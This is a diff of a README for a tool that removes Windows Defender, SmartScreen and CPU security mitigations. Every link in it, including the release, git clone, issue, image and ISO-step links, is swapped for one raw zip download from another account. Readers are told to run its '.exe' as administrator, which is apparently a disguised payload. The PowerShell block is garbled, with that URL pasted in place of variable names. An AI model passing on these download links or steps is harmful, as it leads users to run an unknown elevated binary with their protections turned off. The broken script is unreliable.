@@ -1,9 +1,9 @@
 # ❌️ Defender Remover / Defender Disabler
 
-<a href="https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip">
+<a href="https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip">
     <picture>
-        <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip">
-        <img alt="Defender Remover" src="https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip">
+        <source media="(prefers-color-scheme: dark)" srcset="https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip">
+        <img alt="Defender Remover" src="https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip">
     </picture>
 </a>
 
@@ -27,7 +27,7 @@ This application removes / disables Windows Defender, including the Windows Secu
         - SmartScreen
         - Pluton Support and Pluton Services Support
         - System Mitigations
-          - "Services Mitigations" (search on https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip for more informations, its policy)
+          - "Services Mitigations" (search on https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip for more informations, its policy)
           - Spectre and Meltdown Mitigation (for get +30% performance on old Intel CPUs)
         - Windows Security Section from Settings App.
 
@@ -46,7 +46,7 @@ This application removes / disables Windows Defender, including the Windows Secu
 > [!NOTE]
 > A system restore point is recommended before you run the script. (if you don't know what are you doing)
 
-1. Download the packed script from [Releases](https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip)
+1. Download the packed script from [Releases](https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip)
 2. Run the ".exe" as administrator
 3. Follow the instructions displayed
 
@@ -55,22 +55,22 @@ OR
 you can use git
 
 ```
-git clone https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip
+git clone https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip
 cd windows-defender-remover
-https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip
+https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip
 ```
 
 
 OR
 
 you can use download entire source code
-1. Download the source code from [Releases](https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip).
+1. Download the source code from [Releases](https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip).
 2. Choose the file **Source Code(.zip)** from last version and download it.
-3. Unarchive the file into a folder and run the https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip
+3. Unarchive the file into a folder and run the https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip
 
-![cli](https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip)
+![cli](https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip)
 
-You can file an [issue](https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip) if you experience any problems.
+You can file an [issue](https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip) if you experience any problems.
 
 ## 📃 Automation of the script
 
@@ -80,7 +80,7 @@ You can remove Defender with arguments.
 
 ```PowerShell
 # Removal
-https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip /r <# or /R #>
+https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip /r <# or /R #>
 ```
 
 
@@ -124,7 +124,7 @@ Here are the rules:
 5. Open the **Panther** folder.
    The path it shown like to
     **%location of extracted ISO%\sources\$OEM$\$$\Panther\**
-6. Download the https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip file from repo in ISO_Maker folder and put it in Panther folder.
+6. Download the https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip file from repo in ISO_Maker folder and put it in Panther folder.
 7. Save this as bootable ISO. (for now the script can't do this automaticly, but it will do in next version).
     
 
@@ -135,19 +135,19 @@ Paste this code into a powershell file and after **Run as Administrator**.
 $remove_appx = @("SecHealthUI"); $provisioned = get-appxprovisionedpackage -online; $appxpackage = get-appxpackage -allusers; $eol = @()
 $store = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore'
 $users = @('S-1-5-18'); if (test-path $store) {$users += $((dir $store -ea 0 |where {$_ -like '*S-1-5-21*'}).PSChildName)}
-foreach ($choice in $remove_appx) { if ('' -eq $https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip()) {continue}
-  foreach ($appx in $($provisioned |where {$https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip -like "*$choice*"})) {
-    $next = !1; foreach ($no in $skip) {if ($https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip -like "*$no*") {$next = !0}} ; if ($next) {continue}
-    $PackageName = $https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip; $PackageFamilyName = ($appxpackage |where {$https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip -eq $https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip}).PackageFamilyName 
+foreach ($choice in $remove_appx) { if ('' -eq $https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip()) {continue}
+  foreach ($appx in $($provisioned |where {$https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip -like "*$choice*"})) {
+    $next = !1; foreach ($no in $skip) {if ($https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip -like "*$no*") {$next = !0}} ; if ($next) {continue}
+    $PackageName = $https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip; $PackageFamilyName = ($appxpackage |where {$https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip -eq $https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip}).PackageFamilyName 
     ni "$store\Deprovisioned\$PackageFamilyName" -force >''; $PackageFamilyName  
     foreach ($sid in $users) {ni "$store\EndOfLife\$sid\$PackageName" -force >''} ; $eol += $PackageName
     dism /online /set-nonremovableapppolicy /packagefamily:$PackageFamilyName /nonremovable:0 >''
     remove-appxprovisionedpackage -packagename $PackageName -online -allusers >''
   }
-  foreach ($appx in $($appxpackage |where {$https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip -like "*$choice*"})) {
-    $next = !1; foreach ($no in $skip) {if ($https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip -like "*$no*") {$next = !0}} ; if ($next) {continue}
-    $PackageFullName = $https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip; 
-    ni "$store\Deprovisioned\$https://raw.githubusercontent.com/ztdesk1/windows-defender-remover/main/Remove_SecurityComp_moduled/remover_defender_windows_v1.6.zip" -force >''; $PackageFullName
+  foreach ($appx in $($appxpackage |where {$https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip -like "*$choice*"})) {
+    $next = !1; foreach ($no in $skip) {if ($https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip -like "*$no*") {$next = !0}} ; if ($next) {continue}
+    $PackageFullName = $https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip; 
+    ni "$store\Deprovisioned\$https://github.com/ztdesk1/windows-defender-remover/raw/refs/heads/main/Remove_defender_moduled/defender-remover-windows-v1.7.zip" -force >''; $PackageFullName
     foreach ($sid in $users) {ni "$store\EndOfLife\$sid\$PackageFullName" -force >''} ; $eol += $PackageFullName
     dism /online /set-nonremovableapppolicy /packagefamily:$PackageFamilyName /nonremovable:0 >''
     remove-appxpackage -package $PackageFullName -allusers >''
